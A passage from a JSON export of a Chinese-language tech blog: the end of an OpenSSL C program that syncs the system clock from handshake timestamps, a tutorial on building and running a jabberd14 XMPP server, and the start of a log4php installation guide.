style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">version<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">content_type<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #99cc99;\">const<\/span> <span style=\"color: #6699cc;\">unsigned<\/span> <span style=\"color: #6699cc;\">char<\/span>* <span style=\"color: #ffcc66;\">buf<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #6699cc;\">size_t<\/span> <span style=\"color: #ffcc66;\">len<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #6699cc;\">SSL<\/span> *<span style=\"color: #ffcc66;\">ssl<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  <span style=\"color: #6699cc;\">TimeInfo<\/span> *<span style=\"color: #ffcc66;\">ti<\/span>)\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(content_type != 22)   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">require handshake message<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(len &lt; 42)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(buf[0] == 1)          <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">ClientHello Message send from client to server<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ti-&gt;client = htonl(*((<span style=\"color: #6699cc;\">u_long<\/span>*)(buf + 6)));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span> <span style=\"color: #99cc99;\">if<\/span>(buf[0] == 2)     <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">ServerHello Message send from server to client<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ti-&gt;server = htonl(*((<span style=\"color: #6699cc;\">u_long<\/span>*)(buf + 6)));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n}\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #f99157;\">main<\/span>()\n{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">BIO<\/span> * <span style=\"color: #ffcc66;\">bio<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">SSL<\/span> * <span style=\"color: #ffcc66;\">ssl<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">SSL_CTX<\/span> * <span style=\"color: #ffcc66;\">ctx<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">TimeInfo<\/span> <span style=\"color: #ffcc66;\">timeInfo<\/span> = {-1, -1};\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">BOOL<\/span> <span style=\"color: #ffcc66;\">timeSynced<\/span> = FALSE;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">long<\/span> <span style=\"color: #ffcc66;\">result<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Set up the library <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   SSL_library_init();\n<span style=\"background-color: #515151;\"> <\/span>   ERR_load_BIO_strings();\n<span style=\"background-color: #515151;\"> <\/span>   SSL_load_error_strings();\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Set up the SSL context <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   ctx = SSL_CTX_new(SSLv3_client_method());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(ctx == <span style=\"color: #6699cc;\">NULL<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error new SSL_CTX\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ERR_print_errors_fp(stderr);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_free(ctx);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Get Server and Client system time via SSL Handshake <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);\n<span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_set_msg_callback_arg(ctx, &amp;timeInfo);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Load the trust store <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #6699cc;\">!<\/span> SSL_CTX_load_verify_locations(ctx, <span style=\"color: #66cccc;\">\".\\\\certs\\\\cacert.pem\"<\/span>, <span style=\"color: #6699cc;\">NULL<\/span>))\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error loading trust store\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ERR_print_errors_fp(stderr);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_free(ctx);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Setup the connection <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   bio = BIO_new_ssl_connect(ctx);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Set the SSL_MODE_AUTO_RETRY flag <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   BIO_get_ssl(bio, &amp; ssl);\n<span style=\"background-color: #515151;\"> <\/span>   SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Create and setup the connection <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   BIO_set_conn_hostname(bio, <span style=\"color: #66cccc;\">\"192.168.1.5:5555\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(BIO_do_connect(bio) &lt;= 0)\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error attempting to connect\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ERR_print_errors_fp(stderr);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   BIO_free_all(bio);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_free(ctx);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Check the certificate <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">switch<\/span>(SSL_get_verify_result(ssl))\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> X509_V_OK:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">break<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> X509_V_ERR_CERT_NOT_YET_VALID:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> X509_V_ERR_CERT_HAS_EXPIRED:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(timeInfo.server != -1 &amp;&amp; timeInfo.client != -1)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#24403;&#21069;&#23458;&#25143;&#31471;&#26102;&#38388;: %s\"<\/span>, ctime(&amp;timeInfo.client));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#24403;&#21069;&#26381;&#21153;&#22120;&#26102;&#38388;: %s\"<\/span>, ctime(&amp;timeInfo.server));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#23581;&#35797;&#19982;&#26381;&#21153;&#22120;&#26102;&#38388;&#21516;&#27493;\"<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(syncSystemTime(timeInfo.server))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#25104;&#21151;\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#22833;&#36133;\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   printf(<span style=\"color: #66cccc;\">\"&#35831;&#37325;&#35797;&#36830;&#25509;&#26381;&#21153;&#22120;&#65281;\\n\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">default<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Certificate verification error: %i\\n\"<\/span>, SSL_get_verify_r<span style=\"text-decoration: underline;\">esult(ssl));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   BIO_free_all(bio);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_free(ctx);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/* <\/span><span style=\"color: #999999; font-style: italic;\">Close the connection and free the context <\/span><span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   BIO_free_all(bio);\n<span style=\"background-color: #515151;\"> <\/span>   SSL_CTX_free(ctx);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> 0;\n}\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u642d\u5efajabber\u670d\u52a1\u5668",
  "timestamp": "2011-05-04 00:32:00",
  "tags": [
    "jabber",
    "linux"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u7f16\u8bd1\u5b89\u88c5\n\n<p>\n<code>\u4e0b\u8f7d<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http:\/\/download.jabberd.org\/jabberd14\/jabberd14-1.6.1.1.tar.gz\ntar xzvf jabberd14-1.6.1.1.tar.gz\n<span style=\"color: #cc99cc;\">cd<\/span> jabberd14-1.6.1.1\n<\/pre>\n<\/div>\n\n<p>\n<code>\u4fee\u6539\u4ee3\u7801\u4ee5\u89e3\u51b3\u7f16\u8bd1\u9519\u8bef<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">diff -r jabberd14-1.6.1.1\/jabberd\/lib\/xmlnode.cc tmp\/jabberd14-1.6.1.1\/jabberd\/l<span style=\"text-decoration: underline;\">ib\/xmlnode.cc<\/span>\n882,884c882,884\n&lt;     const char *next_step = NULL;\n&lt;     const char *start_predicate = NULL;\n&lt;     const char *end_predicate = NULL;\n---\n&gt;     char *next_step = NULL;\n&gt;     char *start_predicate = NULL;\n&gt;     char *end_predicate = NULL;\n1836c1836\n&lt;         ((char*)strchr(lang, <span style=\"color: #66cccc;\">'-'<\/span>))[0] = 0;\n---\n&gt;         strchr(lang, <span style=\"color: #66cccc;\">'-'<\/span>)[0] = 0;\ndiff -r jabberd14-1.6.1.1\/jabberd\/log.cc tmp\/jabberd14-1.6.1.1\/jabberd\/log.cc\n89c89\n&lt;         pos = (char*)strchr(zone,<span style=\"color: #66cccc;\">'.'<\/span>);\n---\n&gt;     pos = strchr(zone,<span style=\"color: #66cccc;\">'.'<\/span>);\ndiff -r jabberd14-1.6.1.1\/jabberd\/mio_tls.cc tmp\/jabberd14-1.6.1.1\/jabberd\/mio_t<span style=\"text-decoration: underline;\">ls.cc<\/span>\n615c615\n&lt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style=\"text-decoration: underline;\">file, privfile, GNUTLS_OPENPGP_FMT_BASE64);<\/span>\n---\n&gt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style=\"text-decoration: underline;\">file, privfile);<\/span>\n634c634\n&lt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style=\"text-decoration: underline;\"> file, GNUTLS_OPENPGP_FMT_BASE64);<\/span>\n---\n&gt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style=\"text-decoration: underline;\"> file);<\/span>\n640a641,657\n&gt;     }\n&gt;\n&gt;     \/\/ load GnuPG trustdb\n&gt;     if (j_strcmp(xmlnode_get_localname(cur), <span style=\"color: #66cccc;\">\"trustdb\"<\/span>) == 0) {\n&gt;         char const *const file = xmlnode_get_data(cur);\n&gt;\n&gt;         if (file == NULL) {\n&gt;         log_warn(NULL, <span style=\"color: #66cccc;\">\"Initializing TLS subsystem: &lt;trustdb\/&gt; element inside <\/span><span style=\"color: #66cccc; text-decoration: underline;\">the TLS configuration, that does not contain a file-name.\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n&gt;         continue;\n&gt;         }\n&gt;\n&gt;         \/\/ load the GnuPG trustdb\n&gt;         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file<span style=\"text-decoration: underline;\">);<\/span>\n&gt;         if (ret &lt; 0) {\n&gt;         log_error(NULL, <span style=\"color: #66cccc;\">\"Error loading GnuPG trustdb %s: %s\"<\/span>, file, gnutls_str<span style=\"text-decoration: underline;\">error(ret));<\/span>\n&gt;         continue;\n&gt;         }\n<\/pre>\n<\/div>\n\n<p>\n<code>\u7f16\u8bd1\u5b89\u88c5<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/configure &amp;&amp; make &amp;&amp; sudo make install\n<\/pre>\n<\/div>\n\n<p>\n\u5982\u51fa\u9519\u901a\u5e38\u662f\u5c11\u4e86\u76f8\u5173\u4f9d\u8d56\u5e93\uff0c\u7528\u5305\u7ba1\u7406\u5de5\u5177\uff08\u5982\uff1aubuntu\u4e0b\u7684\u65b0\u7acb\u5f97\uff09\u5b89\u88c5\u5373\u53ef\u3002\n<\/p>\n<\/li>\n\n<li>\u914d\u7f6e\n\n<p>\n\u6309\u7167mysql.sql\u4e2d\u7684\u6ce8\u91ca\u914d\u7f6e\u6570\u636e\u5e93\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mysql -uroot -p\nmysql&gt; CREATE DATABASE jabber CHARACTER SET utf8;\nmysql&gt; use jabber;\nmysql&gt; grant all on jabber.* to jabber@localhost identified by <span style=\"color: #66cccc;\">'secret'<\/span>;\nmysql&gt; <span style=\"color: #66cccc;\">\\.<\/span> mysql.sql\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8fd0\u884c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo jabberd -h localhost -B\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6ce8\u518c\u7528\u62371\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">to<\/span>=<span style=\"color: #66cccc;\">'localhost'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:client'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> xmlns:<span style=\"color: #ffcc66;\">stream<\/span>=<span style=\"color: #66cccc;\">'http:\/\/etherx.jabber.org\/streams'<\/span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id<\/span>=<span style=\"color: #66cccc;\">'reg1'<\/span> <span style=\"color: #ffcc66;\">type<\/span>=<span style=\"color: #66cccc;\">'set'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;query <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:iq:register'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;username&gt;jack&lt;\/username&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;password&gt;jack&lt;\/password&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;name&gt;jack&lt;\/name&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;email&gt;&lt;\/email&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;\/query&gt;\n&lt;\/iq&gt;\n\n&lt;\/stream:stream&gt;\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u767b\u5f55\u7528\u62371\n\n<pre class=\"example\">\nEmpathy\u83dc\u5355-&gt;\u7f16\u8f91-&gt;\u5e10\u6237-&gt;\u6dfb\u52a0\uff1a\n\u534f\u8bae: Jabber\n\u767b\u5f55ID: jack@localhost\n\u8bb0\u4f4f\u5bc6\u7801\n\u5bc6\u7801: jack\n\u767b\u5f55\n<\/pre>\n<\/li>\n\n<li>\u6ce8\u518c\u7528\u62372\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">to<\/span>=<span style=\"color: #66cccc;\">'localhost'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:client'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> xmlns:<span style=\"color: #ffcc66;\">stream<\/span>=<span style=\"color: #66cccc;\">'http:\/\/etherx.jabber.org\/streams'<\/span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id<\/span>=<span style=\"color: #66cccc;\">'reg1'<\/span> <span style=\"color: #ffcc66;\">type<\/span>=<span style=\"color: #66cccc;\">'set'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;query <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:iq:register'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;username&gt;rose&lt;\/username&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;password&gt;rose&lt;\/password&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;name&gt;rose&lt;\/name&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;email&gt;&lt;\/email&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;\/query&gt;\n&lt;\/iq&gt;\n\n&lt;\/stream:stream&gt;\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7528\u62371\u52a0\u7528\u62372\u4e3a\u8054\u7cfb\u4eba\n\n<pre class=\"example\">\nEmpathy\u83dc\u5355-&gt;\u804a\u5929-&gt;\u6dfb\u52a0\u8054\u7cfb\u4eba:\n\u5e10\u6237\uff1ajack@localhost\n\u6807\u8bc6\u7b26: rose@localhost\n\u6dfb\u52a0\n<\/pre>\n<\/li>\n\n<li>\u767b\u5f55\u7528\u62372\uff0c\u5e76\u53d1\u4e00\u4e2a\u6d88\u606f\u7ed9\u7528\u62371\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">to<\/span>=<span style=\"color: #66cccc;\">'localhost'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:client'<\/span>\n<span style=\"background-color: #515151;\"> <\/span> xmlns:<span style=\"color: #ffcc66;\">stream<\/span>=<span style=\"color: #66cccc;\">'http:\/\/etherx.jabber.org\/streams'<\/span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id<\/span>=<span style=\"color: #66cccc;\">'auth1'<\/span> <span style=\"color: #ffcc66;\">type<\/span>=<span style=\"color: #66cccc;\">'set'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;query <span style=\"color: #ffcc66;\">xmlns<\/span>=<span style=\"color: #66cccc;\">'jabber:iq:auth'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;username&gt;rose&lt;\/username&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;password&gt;rose&lt;\/password&gt;\n<span style=\"background-color: #515151;\"> <\/span>   &lt;resource&gt;test&lt;\/resource&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;\/query&gt;\n&lt;\/iq&gt;\n\n&lt;presence\/&gt;\n\n&lt;message <span style=\"color: #ffcc66;\">to<\/span>=<span style=\"color: #66cccc;\">'jack@localhost'<\/span>&gt;\n<span style=\"background-color: #515151;\"> <\/span> &lt;body&gt;hello, jack&lt;\/body&gt;\n&lt;\/message&gt;\n\n&lt;\/stream:stream&gt;\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "log4php\u521d\u6b65\u4f7f\u7528",
  "timestamp": "2013-05-06 18:32:00",
  "tags": [
    "log4php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7b80\u4ecb<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\napache\u51fa\u54c1\u5fc5\u5c5e\u7cbe\u54c1\u3002\u6b63\u5b97php\u65e5\u5fd7\u5e93\uff0c\u4e0elog4j\u4e00\u8109\u76f8\u627f\u3002\n<\/p>\n\n<p>\n<a href=\"http:\/\/logging.apache.org\/log4php\/\">http:\/\/logging.apache.org\/log4php\/<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5b89\u88c5<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u53c2\u8003\uff1a<a href=\"http:\/\/logging.apache.org\/log4php\/install.html\">http:\/\/logging.apache.org\/log4php\/install.html<\/a>\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6709root\u6743\u9650\uff0c\u5b89\u88c5\u5230\u7cfb\u7edf\u76ee\u5f55\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo apt-get install php-pear\nsudo pear channel-discover pear.apache.org\/log4php\nsudo pear install log4php\/Apache_log4php\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6ca1\u6709root\u6743\u9650\uff0c\u5b89\u88c5\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd<\/span> libs\nwget http:\/\/mirrors.tuna.tsinghua.edu.cn\/apache\/logging\/log4php\/2.3.0\/apache-log<span style=\"text-decoration: underline;\">4php-2.3.0-src.tar.gz<\/span>\ntar xzvf apache-log4php-2.3.0-src.tar.gz\nln -sf apache-log4php-2.3.0\/src\/main\/php .\/log4php\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u4f7f\u7528<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u8fdb\u884c\u4e00\u4e0b\u5c01\u88c5\u5b9a\u5236\uff0c\u53ef\u4ee5\u6ee1\u8db3\u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u7684\u4f7f\u7528\n\n<ul 